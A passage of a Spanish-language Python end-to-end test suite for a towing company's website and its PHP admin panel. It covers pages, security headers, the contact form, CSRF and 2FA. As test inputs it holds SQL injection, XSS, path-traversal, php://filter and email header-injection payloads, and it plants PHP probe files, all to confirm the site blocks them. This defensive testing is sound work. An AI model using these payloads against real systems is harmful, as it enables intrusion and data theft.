#!/usr/bin/env python3
"""Batería de pruebas de extremo a extremo (Apache + mod_php). Ver tests/README.md.
Uso: deploy limpio del ZIP en /srv/gxwww, Apache en :8081 y luego  python3 tests/run_tests.py
"""
import hashlib, hmac, http.client, http.cookiejar, io, json, os, re, sqlite3, struct, subprocess, sys, time
import urllib.error, urllib.parse, urllib.request
from html.parser import HTMLParser

BASE = os.environ.get('GX_BASE', 'http://127.0.0.1:8081')
WEB = os.environ.get('GX_WEB', '/srv/gxwww')
BUILTIN = os.environ.get('GX_MODE') == 'builtin'   # php -S: ignora .htaccess; se omiten las pruebas del servidor web
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CRED = open(os.path.join(ROOT, 'dist/CREDENCIALES-INICIALES.txt')).read()
ADMIN_USER, ADMIN_PASS = re.search(r'Panel: (\S+) / (\S+)', CRED).groups()
HT_USER, HT_PASS = re.search(r'HTTP: (\S+) / (\S+)', CRED).groups()
NEW_PASS = 'Nueva-Clave#2026-Gruas!'

results = []


def ok(name, cond, detail=''):
    results.append((bool(cond), name, detail))
    print(('  PASS ' if cond else '  FAIL ') + name + ((' — ' + str(detail)) if (detail and not cond) else ''))
    return bool(cond)


def section(t):
    print('\n== ' + t)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class Client:
    def __init__(self, basic=None):
        self.jar = http.cookiejar.CookieJar()
        self.basic = basic

    def req(self, method, path, data=None, headers=None, follow=True, ctype=None):
        h = dict(headers or {})
        h.setdefault('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) GxTest/1.0')
        if self.basic:
            import base64
            h['Authorization'] = 'Basic ' + base64.b64encode(('%s:%s' % self.basic).encode()).decode()
        body = None
        if data is not None:
            if isinstance(data, (bytes, bytearray)):
                body = bytes(data)
                if ctype:
                    h['Content-Type'] = ctype
            else:
                body = urllib.parse.urlencode(data, doseq=True).encode()
                h['Content-Type'] = 'application/x-www-form-urlencoded'
        handlers = [urllib.request.HTTPCookieProcessor(self.jar)]
        if not follow:
            handlers.append(NoRedirect())
        op = urllib.request.build_opener(*handlers)
        r = urllib.request.Request(BASE + path, data=body, method=method, headers=h)
        try:
            resp = op.open(r, timeout=30)
            return resp.status, dict(resp.headers), resp.read()
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read()

    def get(self, p, **k):
        return self.req('GET', p, **k)

    def post(self, p, data, **k):
        return self.req('POST', p, data=data, **k)


def raw(method, path, headers=None, body=None):
    c = http.client.HTTPConnection(urllib.parse.urlparse(BASE).hostname, urllib.parse.urlparse(BASE).port, timeout=20)
    hh = {'User-Agent': 'Mozilla/5.0 GxTest/1.0'}
    hh.update(headers or {})
    c.request(method, path, body=body, headers=hh)
    r = c.getresponse()
    d = r.read()
    c.close()
    return r.status, dict(r.getheaders()), d


class Forms(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.cur = None
        self.sel = None
        self.ta = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'form':
            self.cur = {'action': a.get('action', ''), 'fields': [], 'act': None}
            self.forms.append(self.cur)
        elif self.cur is not None:
            if tag == 'input':
                t = (a.get('type') or 'text').lower()
                n = a.get('name')
                if not n or t in ('submit', 'button', 'file'):
                    return
                if t in ('checkbox', 'radio') and 'checked' not in a:
                    return
                self.cur['fields'].append([n, a.get('value', '')])
                if n == 'act':
                    self.cur['act'] = a.get('value')
            elif tag == 'textarea':
                self.ta = [a.get('name'), '']
            elif tag == 'select':
                self.sel = {'name': a.get('name'), 'val': None, 'first': None}
            elif tag == 'option' and self.sel is not None:
                v = a.get('value', '')
                if self.sel['first'] is None:
                    self.sel['first'] = v
                if 'selected' in a:
                    self.sel['val'] = v

    def handle_data(self, data):
        if self.ta is not None:
            self.ta[1] += data

    def handle_endtag(self, tag):
        if tag == 'textarea' and self.ta is not None and self.cur is not None:
            self.cur['fields'].append(self.ta)
            self.ta = None
        elif tag == 'select' and self.sel is not None and self.cur is not None:
            v = self.sel['val'] if self.sel['val'] is not None else (self.sel['first'] or '')
            self.cur['fields'].append([self.sel['name'], v])
            self.sel = None
        elif tag == 'form':
            self.cur = None


def form_by_act(html, act):
    p = Forms()
    p.feed(html.decode('utf8') if isinstance(html, bytes) else html)
    for f in p.forms:
        if f['act'] == act:
            return f['fields']
    return None


def fields_set(fields, name, value, all_=False):
    done = False
    for f in fields:
        if f[0] == name:
            f[1] = value
            done = True
            if not all_:
                break
    if not done:
        fields.append([name, value])
    return fields


def fields_get(fields, name):
    for f in fields:
        if f[0] == name:
            return f[1]
    return None


def csrf(html):
    m = re.search(rb'name="_t" value="([a-f0-9]+)"', html)
    return m.group(1).decode() if m else None


def post_fields(c, fields, path='/admin/', follow=True):
    return c.req('POST', path, data=urllib.parse.urlencode([(f[0], f[1]) for f in fields]).encode(),
                 headers={'Content-Type': 'application/x-www-form-urlencoded'}, follow=follow)


def multipart(fields, files):
    b = '----gx' + hashlib.md5(str(time.time()).encode()).hexdigest()
    out = io.BytesIO()
    for k, v in fields:
        out.write(('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (b, k, v)).encode())
    for k, fn, ctype, data in files:
        out.write(('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\nContent-Type: %s\r\n\r\n' % (b, k, fn, ctype)).encode())
        out.write(data)
        out.write(b'\r\n')
    out.write(('--%s--\r\n' % b).encode())
    return out.getvalue(), 'multipart/form-data; boundary=' + b


def b32dec(s):
    import base64
    s = re.sub(r'[^A-Z2-7]', '', s.upper())
    s += '=' * (-len(s) % 8)
    return base64.b32decode(s)


def totp(secret_b32, step):
    key = b32dec(secret_b32)
    h = hmac.new(key, struct.pack('>Q', step), hashlib.sha1).digest()
    o = h[19] & 15
    n = ((h[o] & 0x7f) << 24) | (h[o + 1] << 16) | (h[o + 2] << 8) | h[o + 3]
    return '%06d' % (n % 1000000)


def dbq(sql, args=()):
    files = [f for f in os.listdir(WEB + '/_core/data') if f.endswith('.sqlite')]
    c = sqlite3.connect(WEB + '/_core/data/' + files[0])
    c.row_factory = sqlite3.Row
    cur = c.execute(sql, args)
    rows = cur.fetchall()
    c.commit()
    c.close()
    subprocess.run(['chown', '-R', 'www-data:www-data', WEB + '/_core/data'])
    return rows


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)


def www_write(path, content, mode='wb'):
    full = WEB + '/' + path
    with open(full, mode) as f:
        f.write(content)
    sh('chown www-data:www-data %s' % full)


def reset_integrity_cache():
    try:
        os.remove(WEB + '/_core/data/integrity.state')
    except FileNotFoundError:
        pass


# ------------------------------------------------------------------
PAGES = ['/', '/sobre-nosotros/', '/servicio-de-gruas-24-7/', '/contactenos/']
anon = Client()


def test_public():
    section('A. Sitio público: páginas, enlaces, imágenes, recursos')
    seen = set()
    html = {}
    for p in PAGES:
        s, h, b = anon.get(p)
        ok('GET %s -> 200' % p, s == 200, s)
        html[p] = b.decode('utf8')
    s, h, b = anon.get('/pagina-que-no-existe/')
    ok('404 personalizada (sin rutas/versiones)', s == 404 and b'404' in b and b'Apache' not in b and b'/srv' not in b, s)
    for p in ['/sitemap.xml', '/robots.txt', '/favicon.ico', '/favicon.png', '/favicon-192.png', '/apple-touch-icon.png', '/403.html', '/500.html']:
        s, h, b = anon.get(p)
        ok('GET %s -> 200' % p, s == 200, s)
    sm = anon.get('/sitemap.xml')[2].decode()
    ok('sitemap.xml lista las 4 URLs originales', all(('gruasexpresstowing.gt' + u) in sm for u in PAGES), sm[:200])
    rb = anon.get('/robots.txt')[2].decode()
    ok('robots.txt con Sitemap y sin revelar /admin', 'Sitemap: https://gruasexpresstowing.gt/sitemap.xml' in rb and 'admin' not in rb, rb)

    broken = []
    res_checked = 0
    for p, h in html.items():
        refs = re.findall(r'(?:href|src|poster)="([^"#]+)"', h)
        for srcset in re.findall(r'srcset="([^"]+)"', h):
            refs += [x.strip().split(' ')[0] for x in srcset.split(',')]
        for r in set(refs):
            if r.startswith(('tel:', 'mailto:', 'javascript:')):
                continue
            if r.startswith('https://api.whatsapp.com'):
                continue
            if r.startswith('http'):
                if 'gruasexpresstowing.gt' in r:
                    r = urllib.parse.urlparse(r).path
                else:
                    broken.append(('EXTERNO', p, r))
                    continue
            if r.startswith('//'):
                broken.append(('EXTERNO', p, r))
                continue
            path = r.split('?')[0]
            key = path
            if key in seen:
                continue
            seen.add(key)
            s, hh, bb = anon.get(path)
            res_checked += 1
            if s != 200 or len(bb) == 0:
                broken.append((s, p, r))
    ok('Todos los enlaces/imágenes/CSS/JS/fuentes/videos responden 200 (%d recursos)' % res_checked, not broken, broken[:5])
    ext = [x for p, h in html.items() for x in re.findall(r'(?:src|href)="(https?://[^"]+)"', h)
           if 'gruasexpresstowing.gt' not in x and 'api.whatsapp.com' not in x]
    ok('Cero recursos de terceros (CSS/JS/fuentes/imágenes)', not ext, ext[:5])
    inline = [p for p, h in html.items() if re.search(r'<script(?![^>]*(src=|application/ld\+json))[^>]*>', h) or re.search(r'\sstyle="', h) or '<style' in h]
    ok('Sin <script>/<style>/style="" inline (CSP estricta)', not inline, inline)
    css = anon.get('/assets/css/site.min.css')[2].decode()
    ok('CSS sin @import ni url() externos', not re.search(r'@import|url\(https?:', css))
    return html


def test_parity(html):
    section('B. Paridad de contenido con INVENTARIO.md')
    home = html['/']
    txt = lambda h: re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', h))
    must = {
        '/': ['Bienvenidos a Express Towing', 'Somos una empresa de servicio de grúas guatemalteca.',
              'Contamos con equipo de remolque terrestre, pesado y liviano las 24 horas los 7 días de la semana.',
              'Servicio de grúas las 24 horas', 'a toda la República de Guatemala desde Q250', 'LLÁMENOS', 'ESCRÍBANOS', 'ENVÍE UN EMAIL',
              'Teléfono: 3556-7904', 'Whatsapp: 3556-7904', 'info@gruasexpresstowing.gt', 'Te garantizamos un excelente servicio.',
              'Grúas Express', 'Towing Guatemala', 'Servicio de Grúas 24/7', 'Llámenos: 3556-7904', 'Copyright 2026 - Grúas Express Towing Guatemala',
              'Email: info@gruasexpresstowing.gt', 'INICIO', 'SOBRE NOSOTROS', 'SERVICIO DE GRÚAS 24/7', 'CONTÁCTENOS'],
        '/sobre-nosotros/': ['Somos una empresa guatemalteca que brinda servicio de grúas.',
                             'Contamos con equipo de remolque, terrestre, pesado y liviano las 24 horas los 7 días de la semana.', 'MISIÓN',
                             'Proporcionar un servicio de alta calidad en el transporte y manejo de vehículos livianos y pesados así mismo todo tipo de maquinaria industrial dentro y fuera del país contamos con personal capacitado y equipo acorde al trabajo que se nos presenta.',
                             'VISIÓN', 'Ser una empresa reconocida a nivel nacional por el servicio de remolque de todo tipo de vehículos y maquinaria y que esto motive a los clientes a darnos la oportunidad de servirles.',
                             'LLÁMENOS', 'ESCRÍBANOS', 'ENVÍE UN EMAIL'],
        '/servicio-de-gruas-24-7/': ['Servicio de grúas en Guatemala, urgentes, eficientes y a un precio justo.',
                                     'Ofrecemos el servicio de guas en toda Guatemala, adaptados a sus necesidades y a un precio competitivo.',
                                     'Sabemos la importancia de brindar seguridad y calidad en cada unos de nuestros servicios, es por eso que nos adaptamos a las necesidades de nuestros clientes.',
                                     'HACEMOS TODO LO POSIBLE PARA AUXILIARLO',
                                     'Además, ofrecemos diversos servicios a toda la República las 24 horas, todos los días, para cubrir las necesidades de nuestros clientes.',
                                     'Grúas Express Towing', 'LLÁMENOS'],
        '/contactenos/': ['LLÁMENOS', 'ESCRÍBANOS', 'ENVÍE UN EMAIL', 'Envíenos un mensaje', 'Nombre *', 'Teléfono *', 'Mensaje *', 'Enviar mensaje'],
    }
    for p, items in must.items():
        t = txt(html[p])
        miss = [i for i in items if i not in t]
        ok('Textos exactos en %s (%d)' % (p, len(items)), not miss, miss)
    for p in PAGES:
        h = html[p]
        ok('%s: botón llamar tel:35567904' % p, 'href="tel:35567904"' in h)
        ok('%s: WhatsApp api.whatsapp.com/send?phone=50235567904' % p, 'href="https://api.whatsapp.com/send?phone=50235567904"' in h)
        ok('%s: mailto:info@agroinco.com (destino original)' % p, 'href="mailto:info@agroinco.com"' in h)
        ok('%s: menú con las 4 URLs originales' % p, all(('href="%s"' % u) in h for u in PAGES))
        ok('%s: logo nuevo (y ninguna referencia al logo anterior)' % p, '/uploads/logo.webp' in h and 'logo-mobile' not in h)
    counts = {'/': 22, '/servicio-de-gruas-24-7/': 16}
    for p, n in counts.items():
        got = len(re.findall(r'class="gal-a"', html[p]))
        ok('%s: galería con %d imágenes' % (p, n), got == n, got)
    ok('/: 2 videos en el orden original', html['/'].count('<video') == 2 and html['/'].index('vid-1.mp4') < html['/'].index('vid-2.mp4'))
    ok('/: orden de secciones = original (bienvenida, videos, precio, tarjetas, garantía, galería)',
       [html['/'].find(x) for x in ['sec-welcome', 'sec-videos', 'sec-price', 'sec-cards', 'sec-closing', 'sec-gallery']] ==
       sorted(html['/'].find(x) for x in ['sec-welcome', 'sec-videos', 'sec-price', 'sec-cards', 'sec-closing', 'sec-gallery']))
    ok('Menú con íconos (escritorio y móvil): 8 íconos por página', all(html[p].count('class="ni"') == 8 for p in PAGES), [html[p].count('class="ni"') for p in PAGES])
    css = anon.get('/assets/css/site.min.css')[2].decode()
    ok('Sin mayúsculas forzadas por CSS (el contenido se ve con las mayúsculas del original)', 'text-transform:uppercase' not in css)
    ok('Fondo blanco (color de fondo #fff en el tema)', 'background:var(--bg)' in css and '--bg:#fff' in css.replace(' ', ''))
    rc = subprocess.run([sys.executable, os.path.join(ROOT, 'tests/content_parity.py')], capture_output=True, text=True, env=dict(os.environ, GX_BASE=BASE))
    ok('Paridad de textos: los 81 textos originales de WordPress aparecen idénticos', rc.returncode == 0, rc.stdout[-300:])
    ok('Todas las imágenes de contenido tienen alt (las decorativas llevan aria-hidden)', all(re.search(r'alt="[^"]+"', m) or 'aria-hidden="true"' in m for p in PAGES for m in re.findall(r'<img[^>]+>', html[p])))
    for p in PAGES:
        h = html[p]
        ok('%s: title, description, canonical, Open Graph, JSON-LD LocalBusiness' % p,
           re.search(r'<title>[^<]+</title>', h) and 'name="description"' in h and 'rel="canonical"' in h and 'og:title' in h and '"@type":"LocalBusiness"' in h)
    ok('Title de inicio idéntico al original', '<title>Grúas Express Towing Guatemala</title>' in html['/'])
    ld = json.loads(re.search(r'application/ld\+json">(.*?)</script>', html['/'], re.S).group(1))
    ok('JSON-LD: teléfono +50235567904 y correo', ld.get('telephone') == '+50235567904' and ld.get('email') == 'info@gruasexpresstowing.gt', ld)
    f = html['/contactenos/']
    ok('Formulario: campos y destino WhatsApp 50235567904', all(x in f for x in ['name="name"', 'name="phone"', 'name="email"', 'name="service"', 'name="message"', 'data-wa="50235567904"']))


def test_headers():
    section('C. Cabeceras de seguridad')
    s, h, b = anon.get('/')
    hl = {k.lower(): v for k, v in h.items()}
    csp = hl.get('content-security-policy', '')
    ok('Content-Security-Policy estricta (sin unsafe-inline/unsafe-eval)', csp and 'unsafe-inline' not in csp and 'unsafe-eval' not in csp and "default-src 'self'" in csp, csp)
    for k in ['x-frame-options', 'x-content-type-options', 'referrer-policy', 'permissions-policy']:
        ok('Cabecera %s' % k, k in hl, hl.get(k))
    ok('X-Frame-Options DENY / nosniff', hl.get('x-frame-options') == 'DENY' and hl.get('x-content-type-options') == 'nosniff')
    s, h, b = raw('GET', '/', {'X-Forwarded-Proto': 'https'})
    hl = {k.lower(): v for k, v in h.items()}
    ok('HSTS (sobre HTTPS)', 'strict-transport-security' not in hl or 'max-age' in hl['strict-transport-security'], 'HSTS depende de env=HTTPS (mod_ssl): se verifica la directiva en .htaccess')
    ok('Directiva HSTS presente en .htaccess', 'Strict-Transport-Security' in open(WEB + '/.htaccess').read())
    for m in ['PUT', 'DELETE', 'PATCH', 'OPTIONS']:
        s, _, _ = raw(m, '/')
        ok('Método %s bloqueado' % m, s in (403, 405, 501), s)
    s, _, b = raw('TRACE', '/')
    print('  INFO TRACE -> %s (TraceEnable es una directiva de servidor: ver ANALISIS_SEGURIDAD.md)' % s)
    s, _, _ = raw('HEAD', '/')
    ok('Método HEAD permitido', s == 200, s)


def test_xara_parity():
    section('D. Paridad con Xara: solo estáticos, PHP únicamente en 2 puntos')
    z = sh("unzip -Z1 %s/dist/gruas-express-towing.zip" % ROOT).stdout.split('\n')
    php = sorted(x for x in z if re.search(r'\.(php\d?|phtml|phar)$', x, re.I))
    pub = [x for x in php if not x.startswith('_core/')]
    ok('ZIP: .php públicos = exactamente admin/index.php y enviar.php', pub == ['admin/index.php', 'enviar.php'], pub)
    ok('ZIP: carpetas públicas sin PHP (uploads, media, assets, páginas)', not [x for x in php if x.split('/')[0] in ('uploads', 'media', 'assets', 'sobre-nosotros', 'contactenos', 'servicio-de-gruas-24-7')])
    ok('ZIP: sin node_modules, .git, tools ni código fuente de build', not [x for x in z if re.match(r'(node_modules|\.git|tools|tests)/', x)])
    # PHP fuera de los 2 puntos devuelve 403
    for p in ['/_core/lib/bootstrap.php', '/_core/lib/admin_app.php', '/_core/seed/content.json', '/_core/data/config.json', '/_core/data/baseline.json',
              '/_core/data/php-error.log', '/_core/data/.htpasswd', '/_core/.htaccess', '/.htaccess', '/README.txt', '/admin/.htaccess']:
        s, h, b = anon.get(p)
        ok('403/404 en %s' % p, s in (403, 404) and b'<?php' not in b and b'GX' not in b[:200], s)
    # colocar scripts en carpetas públicas (como lo haría un atacante con acceso FTP) y pedirlos
    probes = {}
    for d in ['uploads', 'media', 'assets/js', 'assets/css', 'assets/fonts', 'sobre-nosotros', 'contactenos', '', 'admin/assets', '_core/data/backups']:
        for n in ['x_probe.php', 'x_probe.phtml', 'x_probe.phar', 'x_probe.php5', 'x_probe.php.jpg', 'x_probe.PHP', 'x_probe.php.webp']:
            path = (d + '/' if d else '') + n
            try:
                www_write(path, b'<?php echo "EJECUTADO-" . (6*7); ?>')
                probes[path] = True
            except Exception as e:
                print('   (no se pudo escribir %s: %s)' % (path, e))
    bad = []
    for path in probes:
        s, h, b = anon.get('/' + path)
        if b'EJECUTADO-42' in b or s == 200:
            bad.append((path, s))
    ok('Ningún script colocado en carpetas públicas se ejecuta ni se sirve (%d pruebas)' % len(probes), not bad, bad[:6])
    s, h, b = anon.get('/enviar.php')
    ok('enviar.php responde (único PHP público) y no es texto', s in (404, 405, 200) and b'<?php' not in b, s)
    s, h, b = anon.get('/admin/index.php')
    ok('admin/index.php exige contraseña HTTP (401)', s == 401, s)
    for path in probes:
        os.remove(WEB + '/' + path)
    reset_integrity_cache()
    ok('Archivos de prueba retirados', not [p for p in probes if os.path.exists(WEB + '/' + p)])
    mon = sh("grep -c 'engine off' %s/.htaccess" % WEB).stdout.strip()
    ok('Motor PHP desactivado en .htaccess raíz y carpetas públicas', int(mon) >= 3 and 'engine off' in open(WEB + '/uploads/.htaccess').read())
    ok('.user.ini con display_errors/expose_php/allow_url_*/disable_functions',
       all(x in open(WEB + '/.user.ini').read() for x in ['display_errors = Off', 'expose_php = Off', 'allow_url_include = Off', 'allow_url_fopen = Off', 'disable_functions', 'passthru', 'pcntl_exec', 'show_source']))


def test_attacks_public():
    section('H. Ataques contra el sitio público (SQLi, XSS, traversal)')
    for q in ["/?id=1' UNION SELECT 1,2,3--", "/?q=1%20union%20select%20password%20from%20users", "/?x=<script>alert(1)</script>", "/?x=%3Cscript%3Ealert(1)%3C/script%3E",
              "/?f=../../etc/passwd", "/?f=..%2f..%2fetc%2fpasswd", "/?a=php://filter/convert.base64-encode/resource=index", "/?a=1;DROP%20TABLE%20users",
              "/?s=sleep(5)", "/?x=javascript:alert(1)"]:
        s, h, b = anon.get(q.replace(' ', '%20'))
        ok('Filtro bloquea %s' % q[:50], s == 403, s)
    for path in ['/uploads/../_core/data/config.json', '/%2e%2e/_core/data/config.json', '/uploads/%2e%2e/%2e%2e/_core/seed/install.json',
                 '/assets/..%2f_core/data/config.json', '/uploads/..%252f_core/data/config.json', '/..%00/etc/passwd']:
        s, h, b = raw('GET', path)
        ok('Path traversal bloqueado %s' % path, s in (400, 403, 404) and b'secret' not in b and b'db_file' not in b, s)
    for ua in ['sqlmap/1.5', 'Nikto/2.1.6', 'Mozilla/5.0 (compatible; Acunetix)']:
        s, h, b = raw('GET', '/', {'User-Agent': ua})
        ok('User-Agent malicioso bloqueado: %s' % ua, s == 403, s)
    s, h, b = anon.get('/wp-login.php')
    ok('/wp-login.php -> 410/403/404 (WordPress ya no existe)', s in (403, 404, 410), s)
    s, h, b = anon.get('/wp-admin/')
    ok('/wp-admin/ -> 410/404', s in (403, 404, 410), s)
    s, h, b = anon.get('/?page_id=14', follow=False)
    ok('301 /?page_id=14 -> /contactenos/', s == 301 and h.get('Location', '').endswith('/contactenos/'), (s, h.get('Location')))
    s, h, b = anon.get('/wp-content/uploads/2022/10/SG-1-300x225.jpeg', follow=False)
    ok('301 imagen antigua de WordPress -> /uploads/sg-1.webp', s == 301 and h.get('Location', '').endswith('/uploads/sg-1.webp'), (s, h.get('Location')))
    s, h, b = anon.get('/index.php', follow=False)
    ok('/index.php (WordPress) -> 403: ningún PHP público fuera de los 2 puntos', s == 403, s)
    s, h, b = anon.get('/sobre-nosotros', follow=False)
    ok('301 /sobre-nosotros -> /sobre-nosotros/ (barra final)', s == 301, s)


def test_form():
    section('F. Formulario de contacto (→ WhatsApp + copia en base de datos)')
    c = Client()
    s, h, b = c.get('/enviar.php?t=1', headers={'Accept': 'application/json'})
    j = json.loads(b)
    ok('GET token JSON', s == 200 and j.get('ok') and re.match(r'^\d{10}\.[a-f0-9]{16}\.[a-f0-9]{64}$', j['t']), b[:100])
    tok = j['t']
    data = {'name': 'Juan Pérez', 'phone': '5555-1234', 'email': 'juan@example.com', 'service': 'Remolque de vehículo liviano', 'place': 'Zona 10', 'message': 'Necesito una grúa urgente', 'website': '', 'token': tok}
    s, h, b = c.post('/enviar.php', data, headers={'Accept': 'application/json'})
    ok('Token demasiado reciente rechazado', s == 400, (s, b[:80]))
    time.sleep(2.3)
    tok = json.loads(c.get('/enviar.php?t=1', headers={'Accept': 'application/json'})[2])['t']
    time.sleep(2.3)
    data['token'] = tok
    s, h, b = c.post('/enviar.php', data, headers={'Accept': 'application/json'})
    ok('Envío válido -> ok', s == 200 and json.loads(b).get('ok'), (s, b[:120]))
    rows = dbq('SELECT * FROM messages ORDER BY id DESC LIMIT 1')
    ok('Copia guardada en la base de datos', rows and rows[0]['name'] == 'Juan Pérez' and rows[0]['service'] == 'Remolque de vehículo liviano' and rows[0]['place'] == 'Zona 10')
    s, h, b = c.post('/enviar.php', data, headers={'Accept': 'application/json'})
    ok('Token ya usado (anti-replay) rechazado', s == 400, s)
    time.sleep(2.3)
    tok = json.loads(c.get('/enviar.php?t=1', headers={'Accept': 'application/json'})[2])['t']
    time.sleep(2.3)
    d2 = dict(data, token=tok, website='http://spam.example')
    n0 = dbq('SELECT COUNT(*) n FROM messages')[0]['n']
    s, h, b = c.post('/enviar.php', d2, headers={'Accept': 'application/json'})
    ok('Honeypot: respuesta "ok" pero no se guarda', s == 200 and dbq('SELECT COUNT(*) n FROM messages')[0]['n'] == n0, s)
    for label, mod, expect in [('nombre vacío', {'name': ''}, 422), ('teléfono inválido', {'phone': 'abc'}, 422), ('correo con inyección de cabeceras', {'email': 'a@b.com\r\nBcc: victima@evil.com'}, 422),
                               ('sin servicio', {'service': ''}, 422), ('mensaje corto', {'message': 'hi'}, 422)]:
        time.sleep(0.1)
        tok = json.loads(c.get('/enviar.php?t=1', headers={'Accept': 'application/json'})[2])['t']
        time.sleep(2.2)
        d3 = dict(data, token=tok)
        d3.update(mod)
        s, h, b = c.post('/enviar.php', d3, headers={'Accept': 'application/json'})
        ok('Validación servidor: %s -> %d' % (label, expect), s == expect, (s, b[:100]))
    # límite por IP: ya se hicieron varios envíos; seguir hasta 429
    got429 = False
    for i in range(8):
        tok = json.loads(c.get('/enviar.php?t=1', headers={'Accept': 'application/json'})[2])['t']
        time.sleep(2.2)
        d4 = dict(data, token=tok, name='Carga %d' % i)
        s, h, b = c.post('/enviar.php', d4, headers={'Accept': 'application/json'})
        if s == 429:
            got429 = True
            break
    ok('Límite de envíos por IP (429)', got429)
    s, h, b = c.req('POST', '/enviar.php', data=b'{"a":1}', ctype='application/json', headers={'Accept': 'application/json'})
    ok('Content-Type no permitido rechazado', s in (415, 429), s)
    s, h, b = c.req('POST', '/enviar.php', data=urllib.parse.urlencode(data).encode(), headers={'Origin': 'https://evil.example', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json'})
    ok('Origen externo rechazado', s in (403, 429), s)
    dbq('DELETE FROM rate_limit')
    # XSS guardado: se prueba al ver el mensaje en el panel
    time.sleep(0.2)
    tok = json.loads(c.get('/enviar.php?t=1', headers={'Accept': 'application/json'})[2])['t']
    time.sleep(2.3)
    xss = '<script>alert("xss1")</script><img src=x onerror=alert(2)>'
    d5 = dict(data, token=tok, message=xss + ' texto largo', name='<b>Hacker</b>')
    s, h, b = c.post('/enviar.php', d5, headers={'Accept': 'application/json'})
    ok('Mensaje con HTML/XSS aceptado como texto', s == 200, (s, b))
    sh("chown -R www-data:www-data %s/_core/data" % WEB)


def login(c, user, pw, ref=None):
    s, h, b = c.get('/admin/')
    t = csrf(b)
    return c.post('/admin/', {'act': 'login', '_t': t, 'u': user, 'pw': pw}), t


def test_admin():
    section('E. Panel: acceso, 2FA, edición y publicación')
    c = Client()
    if not BUILTIN:
        s, h, b = c.get('/admin/')
        ok('Panel sin contraseña HTTP -> 401 con WWW-Authenticate: Basic', s == 401 and 'Basic' in h.get('WWW-Authenticate', ''), (s, h))
    c = Client(basic=(HT_USER, HT_PASS))
    if not BUILTIN:
        s, h, b = Client(basic=(HT_USER, 'mala')).get('/admin/')
        ok('Contraseña HTTP incorrecta -> 401', s == 401, s)
    s, h, b = c.get('/admin/')
    ok('Con contraseña HTTP aparece el login', s == 200 and b'Iniciar sesi' in b, s)
    hl = {k.lower(): v for k, v in h.items()}
    ok('Panel: noindex + no-store + CSP (PHP)', 'noindex' in hl.get('x-robots-tag', '') and 'no-store' in hl.get('cache-control', '') and 'unsafe-inline' not in hl.get('content-security-policy', ''), hl)
    ok('Cookie de sesión HttpOnly + SameSite=Strict', 'httponly' in hl.get('set-cookie', '').lower() and 'samesite=strict' in hl.get('set-cookie', '').lower(), hl.get('set-cookie'))
    t = csrf(b)
    r, _ = login(c, ADMIN_USER, 'incorrecta')
    ok('Login incorrecto: mensaje genérico', b'Usuario o contrase' in r[2] and b'incorrectos' in r[2], r[2][:200])
    r, _ = login(c, 'noexiste', 'x')
    ok('Usuario inexistente: mismo mensaje genérico', b'Usuario o contrase' in r[2])
    r = c.post('/admin/', {'act': 'login', 'u': ADMIN_USER, 'pw': 'x'})
    ok('POST sin token CSRF rechazado', b'no es v' in r[2], r[2][:200])
    r = c.post('/admin/', {'act': 'login', '_t': 'a' * 48, 'u': ADMIN_USER, 'pw': ADMIN_PASS})
    ok('POST con token CSRF falso rechazado', b'no es v' in r[2])
    r, _ = login(c, "admin' OR '1'='1", "' OR '1'='1")
    ok('SQLi en login no entra', b'incorrectos' in r[2])
    r, _ = login(c, ADMIN_USER, ADMIN_PASS)
    ok('Login correcto exige cambio de contraseña inicial', b'Cree su contrase' in r[2], r[2][:300])
    fields = form_by_act(r[2], 'pw_change')
    fields_set(fields, 'cur', ADMIN_PASS)
    fields_set(fields, 'new1', 'corta')
    fields_set(fields, 'new2', 'corta')
    r = post_fields(c, fields)
    ok('Contraseña débil rechazada', b'al menos 12' in r[2] or b'Cree su contrase' in r[2])
    r = c.get('/admin/')
    fields = form_by_act(r[2], 'pw_change')
    fields_set(fields, 'cur', ADMIN_PASS)
    fields_set(fields, 'new1', NEW_PASS)
    fields_set(fields, 'new2', NEW_PASS)
    r = post_fields(c, fields)
    ok('Cambio de contraseña inicial OK', b'Contrase\xc3\xb1a actualizada' in r[2], r[2][:200])
    # navegación por todas las vistas
    for p in ['panel', 'paginas', 'pagina&s=inicio', 'pagina&s=sobre-nosotros', 'pagina&s=servicio-de-gruas-24-7', 'pagina&s=contactenos', 'medios', 'ajustes', 'mensajes', 'seguridad', 'respaldos', 'registro', 'cuenta']:
        s, h, b = c.get('/admin/?p=' + p)
        ok('Vista %s carga sin errores' % p, s == 200 and b'<!doctype html>' in b and b'Warning' not in b and b'Fatal' not in b, s)
    # 2FA
    r = c.get('/admin/?p=cuenta')
    f = form_by_act(r[2], 'totp_start')
    r = post_fields(c, f)
    m = re.search(rb'class="secret"><code>([A-Z2-7 ]+)</code>', r[2])
    ok('2FA: se muestra la clave TOTP', bool(m))
    secret = m.group(1).decode().replace(' ', '')
    f = form_by_act(r[2], 'totp_enable')
    fields_set(f, 'cur', NEW_PASS)
    fields_set(f, 'code', '000000')
    r = post_fields(c, f)
    ok('2FA: código incorrecto rechazado', b'c\xc3\xb3digo no coincide' in r[2] or b'no coincide' in r[2])
    r = c.get('/admin/?p=cuenta')
    f = form_by_act(r[2], 'totp_enable')
    step = int(time.time() // 30)
    fields_set(f, 'cur', NEW_PASS)
    fields_set(f, 'code', totp(secret, step))
    r = post_fields(c, f)
    ok('2FA: activación con código válido', b'dos pasos activada' in r[2], r[2][:200])
    # cerrar sesión y entrar con 2FA
    f = form_by_act(c.get('/admin/')[2], 'logout')
    post_fields(c, f)
    r, _ = login(c, ADMIN_USER, NEW_PASS)
    ok('Login pide el segundo factor', b'dos pasos' in r[2])
    f = form_by_act(r[2], 'login2')
    fields_set(f, 'code', '123456')
    r = post_fields(c, f)
    ok('2FA: código erróneo en login rechazado', b'digo incorrecto' in r[2])
    r = c.get('/admin/')
    f = form_by_act(r[2], 'login2')
    fields_set(f, 'code', totp(secret, step + 1))
